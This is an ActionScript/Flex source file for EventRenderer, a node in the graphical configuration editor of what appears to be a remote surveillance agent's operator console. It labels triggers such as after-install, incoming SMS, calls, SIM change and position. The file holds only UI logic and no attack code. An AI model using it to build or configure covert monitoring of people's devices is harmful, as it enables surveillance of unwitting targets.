package it.ht.rcs.console.operations.view.configuration.advanced.renderers
{
  import flash.events.KeyboardEvent;
  import flash.events.MouseEvent;
  import flash.geom.Point;
  import flash.ui.Keyboard;
  import flash.ui.Mouse;
  import flash.ui.MouseCursor;
  
  import it.ht.rcs.console.operations.view.configuration.advanced.ConfigurationGraph;
  import it.ht.rcs.console.operations.view.configuration.advanced.forms.events.EventForm;
  import it.ht.rcs.console.utils.Size;
  
  import mx.binding.utils.BindingUtils;
  import mx.managers.PopUpManager;
  
  import spark.components.BorderContainer;
  import spark.components.Group;
  import spark.components.Label;
  import spark.primitives.BitmapImage;

  public class EventRenderer extends Group implements Linkable
	{
    private static const WIDTH_EXPANDED:Number  = 170;
    private static const WIDTH_COLLAPSED:Number = 50;
    private static const HEIGHT:Number = 50;
    
    private static const NORMAL_COLOR:uint   = 0xffffff;
    private static const SELECTED_COLOR:uint = 0xdddddd;
    private static const ACCEPT_COLOR:uint   = 0x99bb99;
    private static const REJECT_COLOR:uint   = 0xbb9999;
    private static const DISABLED_COLOR:uint = 0xE0E0E0;
    private static const DISABLED_ALPHA:Number = 0.5;
		
    private var container:BorderContainer;
    private var icon:BitmapImage;
		private var textLabel:Label;
    
    public var inBound:Vector.<Connection> = new Vector.<Connection>();
    public function inBoundConnections():Vector.<Connection>  { return inBound; }
    public function outBoundConnections():Vector.<Connection> { return null; }
    
    public var startPin:Pin;
    public var repeatPin:Pin;
    public var endPin:Pin;
    
    private var graph:ConfigurationGraph;
    
    public var event:Object;
		
		public function EventRenderer(event:Object, graph:ConfigurationGraph)
		{
			super();
      layout = null;
      doubleClickEnabled = true;
      width = graph.collapsed ? WIDTH_COLLAPSED : WIDTH_EXPANDED;
      height = HEIGHT;
      
			this.event = event;
      this.graph = graph;
      
      addEventListener(MouseEvent.MOUSE_DOWN, onMouseDown);
      addEventListener(MouseEvent.MOUSE_OVER, onMouseOver);
      addEventListener(MouseEvent.MOUSE_OUT, onMouseOut);
      addEventListener(MouseEvent.MOUSE_UP, onMouseUp);
      addEventListener(MouseEvent.CLICK, onClick);
      addEventListener(MouseEvent.DOUBLE_CLICK, onDoubleClick);
      addEventListener(KeyboardEvent.KEY_DOWN, onKeyDown);
		}
    
    private function onMouseDown(me:MouseEvent):void
    {
      me.stopPropagation();
    }
    
    private function onMouseOver(me:MouseEvent):void
    {
      me.stopPropagation();
      Mouse.cursor = MouseCursor.AUTO;
      
      if (graph.mode == ConfigurationGraph.CONNECTING) {
        var pin:Pin = graph.currentConnection.from as Pin;
        var origin:Object = pin.parent;
        if (origin is ActionRenderer && ( pin.type == 'enable' || pin.type == 'disable' ) && !isConnected(origin)) { // Accept only inbound connections from actions not already connected
          graph.currentTarget = this;
          container.setStyle('backgroundColor', ACCEPT_COLOR);
        } else {
          graph.currentTarget = null;
          container.setStyle('backgroundColor', REJECT_COLOR);
        }
      }
    }
    
    private function isConnected(origin:Object):Boolean
    {
      for each (var c:Connection in inBound)
        if (c.from['parent'] === origin)
          return true;
      return false;
    }
    
    private function onMouseOut(me:MouseEvent):void
    {
      if (graph.mode == ConfigurationGraph.CONNECTING) {
        graph.currentTarget = null;
        if(event.enabled)
        {
          container.setStyle('backgroundColor', NORMAL_COLOR);
          container.alpha=1;
        }
        else
        {
          container.setStyle('backgroundColor', DISABLED_COLOR);
          container.alpha=DISABLED_ALPHA;
        }
      }
    }
    
    private function onMouseUp(me:MouseEvent):void
    {
      if (graph.mode == ConfigurationGraph.CONNECTING)
        if(event.enabled)
        {
          container.alpha=1;
          container.setStyle('backgroundColor', NORMAL_COLOR);
        }
        else
        {
          container.alpha=DISABLED_ALPHA;
          container.setStyle('backgroundColor', DISABLED_COLOR);
        }
    }
    
    private function onClick(me:MouseEvent):void
    {
      me.stopPropagation();
      graph.removeSelection();
      
      selected = true;
      graph.selectedElement = this;
      
      setFocus();
      graph.highlightElement(this);
    }
    
    public function onDoubleClick(me:MouseEvent):void
    {
      if (event.subtype && event.subtype == 'startup') return; // Do not edit startup event
      
      var popup:EventForm = PopUpManager.createPopUp(root, EventForm, true) as EventForm;
      popup.event = event;
      popup.graph = graph;
      PopUpManager.centerPopUp(popup);
    }
    
    private function onKeyDown(ke:KeyboardEvent):void
    {
      if (ke.keyCode == Keyboard.DELETE || ke.keyCode == Keyboard.BACKSPACE)
        deleteEvent();
    }
    
    public function deleteEvent():void
    {
      graph.removeSelection();
      graph.removeHighlight();
      
      var conns:Vector.<Connection> = getAllConnections();
      for each (var c:Connection in conns)
        c.deleteConnection();
      
      graph.removeElement(this);
      var index:int = graph.config.events.indexOf(event);
      graph.config.events.splice(index, 1);
      graph.fixActionIndices(index);
    }
    
    private function getAllConnections():Vector.<Connection>
    {
      var v:Vector.<Connection> = new Vector.<Connection>();
      v = v.concat(inBoundConnections());
      v = v.concat(startPin.outBoundConnections());
      v = v.concat(repeatPin.outBoundConnections());
      v = v.concat(endPin.outBoundConnections());
      return v;
    }
    
    private var _selected:Boolean = false;
    public function get selected():Boolean { return _selected; }
    public function set selected(s:Boolean):void
    {
      _selected = s;
      if(event.enabled)
      {
        container.alpha=1
        container.setStyle('backgroundColor', _selected ? SELECTED_COLOR : NORMAL_COLOR); 
      }
      else
      {
        container.alpha=DISABLED_ALPHA
        container.setStyle('backgroundColor', _selected ? SELECTED_COLOR : DISABLED_COLOR);
      }
    }
    
    override protected function createChildren():void
    {
			super.createChildren();
      
      if (container == null) {
        container = new BorderContainer();
        container.width = width;
        container.height = height;
        
        if(event.enabled)
        {
          container.alpha=1;
          container.setStyle('backgroundColor', NORMAL_COLOR);
        }
        else
        { 
          container.alpha=DISABLED_ALPHA;
          container.setStyle('backgroundColor', DISABLED_COLOR);
        }

      
        container.setStyle('borderColor', 0xdddddd);
        container.setStyle('cornerRadius', 10);
        
        icon = new BitmapImage();
        icon.left = 6;
        icon.verticalCenter = -1;
        icon.source = ModuleIcons[event.event];
        icon.alpha=event.enabled? 1: DISABLED_ALPHA;
        container.addElement(icon);
        
        textLabel = new Label();
        BindingUtils.bindSetter(changeLabel, event, 'desc');
        textLabel.left = 50;
        textLabel.right = 0;
        textLabel.height = height;
        textLabel.maxDisplayedLines = 2;
        container.addElement(textLabel);
        
        addElement(container);
      }

      if (startPin == null) {
        startPin = new Pin(graph, 0, 1, 'start');
        BindingUtils.bindProperty(startPin, 'visible', graph, { name: 'mode', getter: isStartVisible });
        startPin.x = 5;
        startPin.y = height;
        startPin.toolTip = 'Start';
        addElement(startPin);
      }
      
      if (repeatPin == null) {
        repeatPin = new Pin(graph, 0, 1, 'repeat');
        BindingUtils.bindProperty(repeatPin, 'visible', graph, { name: 'mode', getter: isRepeatVisible });
        repeatPin.x = width / 2;
        repeatPin.y = height;
        repeatPin.toolTip = 'Repeat';
        addElement(repeatPin);
      }
      
      if (endPin == null) {
        endPin = new Pin(graph, 0, 1, 'end');
        BindingUtils.bindProperty(endPin, 'visible', graph, { name: 'mode', getter: isEndVisible });
        endPin.x = width - 5;
        endPin.y = height;
        endPin.toolTip = 'End';
        addElement(endPin);
      }
      
      adjustPins();
		}
    
    private function adjustPins():void
    {
      if (startPin)  startPin.visible  = true;
      if (repeatPin) repeatPin.visible = true;
      if (endPin)    endPin.visible    = true;
      
      if (event.event == 'window' ||
        event.event == 'winevent' ||
        event.event == 'sms'      ||
        event.event == 'simchange') {
        if (repeatPin) repeatPin.visible = false;
        if (endPin)    endPin.visible    = false;
      }
      
      if ((event.event == 'timer' && event.subtype == 'loop') ||
        event.event == 'afterinst') {
        if (endPin)    endPin.visible    = false;
      }
    }
    
    public function changeLabel(object:Object):void
    {
      textLabel.text = object == null || object == '' ? getLabel() : object as String;
      toolTip = textLabel.text + '\n' + (event.enabled ? 'Enabled' : 'Disabled');
    }
    
    private function getLabel():String
    {
      switch (event.event) {
        case 'timer':      return 'Timer ' + event.subtype + (event.subtype == 'daily' ? '\n(' + event.ts + ' - ' + event.te + ')' : '');
        case 'date':       return 'Timer date\n(' + event.datefrom.split(' ')[0] + ')';
        case 'afterinst':  return 'After install\n(' + event.days + ' day' + (event.days == 1 ? '' : 's') + ')';
        case 'connection': return 'On connection' + (graph.config.globals.type == 'mobile' ? '' : '\n(' + event.ip + ')');
        case 'idle':       return 'On Idle\n(' + (event.time) + ' sec )';
        case 'process':    return 'On process\n(' + event.process + ')';
        case 'quota':      return 'On quota\n(' + Size.toHumanBytes(event.quota) + ')';
        case 'winevent':   return 'On WinEvent\n(' + event.source + ')';
        case 'battery':    return 'On battery\n(' + event.min + '%  -  ' + event.max + '%)';
        case 'call':       return 'On call from ' + (event.number ? event.number : 'any number');
        case 'position':   return 'On position\n' + event.type.toUpperCase();
        case 'sms':        return 'On sms from ' + event.number;
        default:           return 'On ' + event.event;
      }
    }
    
    private function isStartVisible(graph:ConfigurationGraph):Boolean  { return isVisible(graph, startPin);  }
    private function isRepeatVisible(graph:ConfigurationGraph):Boolean { return isVisible(graph, repeatPin); }
    private function isEndVisible(graph:ConfigurationGraph):Boolean    { return isVisible(graph, endPin);    }
    private function isVisible(graph:ConfigurationGraph, pin:Pin):Boolean {
      if (graph.mode == ConfigurationGraph.CONNECTING)
        return graph.currentConnection.from === pin;
      else { adjustPins(); return pin.visible; }
    }
		
    public function getLinkPoint():Point
    {
      return new Point(x + width/4, y + height);
    }
		
	}
	
}